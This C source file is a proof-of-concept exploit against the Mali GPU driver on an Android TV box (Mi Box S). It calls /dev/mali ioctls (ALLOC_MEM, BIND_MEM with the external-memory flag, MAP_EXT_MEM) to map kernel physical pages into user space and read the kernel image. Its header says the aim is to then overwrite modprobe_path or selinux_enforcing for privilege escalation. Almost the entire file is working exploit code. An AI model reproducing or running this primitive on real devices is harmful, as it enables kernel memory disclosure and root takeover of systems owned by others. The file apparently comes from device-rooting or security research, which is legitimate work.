/*
 * kort_phys_read.c - 验证 Mali physmem 读取原语 (Mi Box S / MIBOX4)
 *
 * 核心问题: BIND_MEM (MEMORY nr=2, EXTERNAL_MEMORY flag) 绑定内核物理页后,
 * 能否通过 mmap(/dev/mali, gpu_vaddr) 直接从 CPU 读取物理内存?
 *
 * 如果成功 -> 直接读/写 modprobe_path / selinux_enforcing 物理地址提权,
 * 完全绕开 PP job 和 /proc 触发点。
 *
 * 安全: 只读测试, 零写入。读内核镜像 0x01080000 页并与本地 Image 比对。
 *
 * 编译:
 *   $clang = NDK/armv7a-linux-androideabi24-clang.cmd
 *   & $clang kort_phys_read.c -o kort_phys_read -static
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define MALI_IOC_BASE 0x82
#define _MALI_UK_CORE_SUBSYSTEM   0
#define _MALI_UK_MEMORY_SUBSYSTEM 1
#define MALI_IOC_CORE_BASE   (MALI_IOC_BASE + _MALI_UK_CORE_SUBSYSTEM)
#define MALI_IOC_MEMORY_BASE (MALI_IOC_BASE + _MALI_UK_MEMORY_SUBSYSTEM)

#define _MALI_UK_ALLOC_MEM 0
#define _MALI_UK_BIND_MEM  2
#define _MALI_UK_MAP_EXT_MEM 13
#define _MALI_UK_UNMAP_EXT_MEM 14

#define _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY (1 << 11)

#define _IOWR(t,n,s) (((3)<<30)|((s)<<16)|((t)<<8)|(n))
#define _IOW(t,n,s)  (((1)<<30)|((s)<<16)|((t)<<8)|(n))

#define PAGE_SIZE 4096

/* ALLOC_MEM 40 字节 (frels 布局, 已验证 size=40) */
typedef struct {
    uint64_t ctx;            /* 0-7  */
    uint32_t gpu_vaddr;      /* 8-11 (输出) */
    uint32_t vsize;          /* 12-15 */
    uint32_t psize;          /* 16-19 */
    uint32_t flags;          /* 20-23 */
    uint64_t backend_handle; /* 24-31 (输出) */
    int32_t  secure_shared_fd; /* 32-35 */
} alloc_mem_s;               /* 40 bytes */

/* BIND_MEM 40 字节 (已验证 size=40) */
typedef struct {
    uint64_t ctx;            /* 0-7  */
    uint32_t vaddr;          /* 8-11 */
    uint32_t size;           /* 12-15 */
    uint32_t flags;          /* 16-19 */
    uint32_t phys_addr;      /* 20-23 (bind_ext_memory) */
    uint32_t rights;         /* 24-27 */
    uint32_t uflags;         /* 28-31 */
    uint32_t padding;        /* 32-35 */
    int32_t  secure_shared_fd; /* 36-39 */
} bind_mem_s;                /* 40 bytes */

/* MAP_EXT_MEM 28 字节 (kort 系列) */
typedef struct {
    uint32_t ctx;
    uint32_t phys_addr;
    uint32_t size;
    uint32_t mali_address;
    uint32_t rights;
    uint32_t flags;
    uint32_t cookie;
} map_ext_mem_s;             /* 28 bytes */

static volatile int g_to = 0;
static void alh(int s) { g_to = 1; }

static int tio(int fd, unsigned int cmd, void *buf, int t) {
    alarm(t); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno;
    alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

static void dump32(const uint32_t *p, int n) {
    for (int i = 0; i < n; i++) printf("  +0x%02x: 0x%08x\n", i*4, p[i]);
}

int main() {
    signal(SIGALRM, alh);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("[*] kort_phys_read - Mali physmem read primitive test\n");
    printf("[*] Target: kernel phys 0x01080000 (ARM64 Image)\n\n");

    int fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { perror("[-] open /dev/mali"); return 1; }
    printf("[+] opened /dev/mali fd=%d\n", fd);

    /* ---- Step 1: ALLOC_MEM ---- */
    printf("\n[1] ALLOC_MEM (nr=0, size=40) ...\n");
    alloc_mem_s alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.ctx = 0;
    alloc.vsize = 0x4000;
    alloc.psize = 0x4000;
    alloc.flags = 0;
    int r = tio(fd, _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_ALLOC_MEM, sizeof(alloc_mem_s)), &alloc, 3);
    if (r == -999) { printf("[-] TIMEOUT\n"); close(fd); return 1; }
    if (r != 0) {
        printf("[-] ALLOC_MEM failed err=%d (errno=%s)\n", -r, strerror(-r));
        printf("    (continue anyway - BIND might not need it)\n");
    } else {
        printf("[+] ALLOC_MEM OK: gpu_vaddr=0x%08x backend_handle=0x%llx\n",
               alloc.gpu_vaddr, (unsigned long long)alloc.backend_handle);
        /* ---- Step 1b: mmap the GPU allocation, test CPU access ---- */
        if (alloc.gpu_vaddr) {
            void *p = mmap(NULL, 0x4000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, alloc.gpu_vaddr);
            if (p == MAP_FAILED) {
                printf("[-] mmap(alloc) failed: %s\n", strerror(errno));
            } else {
                printf("[+] mmap(alloc) OK at %p - testing write/read ...\n", p);
                memset(p, 0xAB, 0x1000);
                uint8_t chk = ((uint8_t*)p)[0x123];
                printf("[+] write+read GPU mem OK (0x%02x)\n", chk);
                munmap(p, 0x4000);
            }
        }
    }

    /* ---- Step 2: BIND_MEM external physical memory ---- */
    printf("\n[2] BIND_MEM: phys 0x01080000 -> GPU 0x40200000 (size=40) ...\n");
    bind_mem_s bind;
    memset(&bind, 0, sizeof(bind));
    bind.vaddr   = 0x40200000;
    bind.size    = PAGE_SIZE;
    bind.flags   = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;
    bind.phys_addr = 0x01080000;   /* kernel Image first page */
    bind.rights  = 0x37;
    r = tio(fd, _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_BIND_MEM, sizeof(bind_mem_s)), &bind, 3);
    if (r == -999) { printf("[-] BIND TIMEOUT\n"); close(fd); return 1; }
    if (r != 0) {
        printf("[-] BIND_MEM failed err=%d (%s)\n", -r, strerror(-r));
        printf("    try MAP_EXT_MEM route instead\n");
    } else {
        printf("[+] BIND_MEM OK\n");

        /* ---- Step 3: mmap bound page, read kernel image ---- */
        printf("\n[3] mmap GPU 0x40200000 and read ...\n");
        void *m = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0x40200000);
        if (m == MAP_FAILED) {
            printf("[-] mmap(bind) failed: %s\n", strerror(errno));
        } else {
            uint32_t *u = (uint32_t *)m;
            printf("[+] mmap(bind) OK at %p\n", m);
            printf("[+] Kernel Image header (expect code0=0x14498000 text_offset=0x01080000):\n");
            dump32(u, 8);
            if (u[0] == 0x14498000) {
                printf("\n[+] VERIFIED: reading kernel phys page via GPU map WORKS!\n");
                printf("[+] physmem READ primitive established!\n");
            } else {
                printf("\n[-] data mismatch - maybe not kernel page or mapping wrong\n");
            }
            /* check a bit further in, find kernel text magic */
            printf("[+] bytes at +0x100: ");
            for (int i = 0; i < 16; i++) printf("%02x ", ((uint8_t*)m)[0x100+i]);
            printf("\n");
            munmap(m, PAGE_SIZE);
        }
    }

    /* ---- Step 4: MAP_EXT_MEM alternative (kort style, nr=13) ---- */
    printf("\n[4] MAP_EXT_MEM (nr=13): phys 0x01080000 -> GPU 0x40201000 ...\n");
    map_ext_mem_s ext;
    memset(&ext, 0, sizeof(ext));
    ext.phys_addr    = 0x01080000;
    ext.size         = PAGE_SIZE;
    ext.mali_address = 0x40201000;
    ext.rights       = 0x37;
    r = tio(fd, _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_MAP_EXT_MEM, sizeof(map_ext_mem_s)), &ext, 3);
    if (r == -999) { printf("[-] MAP_EXT TIMEOUT\n"); close(fd); return 1; }
    if (r != 0) {
        printf("[-] MAP_EXT_MEM failed err=%d (%s)\n", -r, strerror(-r));
    } else {
        printf("[+] MAP_EXT_MEM OK cookie=%u\n", ext.cookie);
        void *m = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0x40201000);
        if (m == MAP_FAILED) {
            printf("[-] mmap(ext) failed: %s\n", strerror(errno));
        } else {
            uint32_t *u = (uint32_t *)m;
            printf("[+] mmap(ext) OK, first words: 0x%08x 0x%08x 0x%08x 0x%08x\n",
                   u[0], u[1], u[2], u[3]);
            if (u[0] == 0x14498000)
                printf("[+] VERIFIED: MAP_EXT_MEM physmem read WORKS!\n");
            munmap(m, PAGE_SIZE);
        }
    }

    close(fd);
    printf("\n[*] done\n");
    return 0;
}
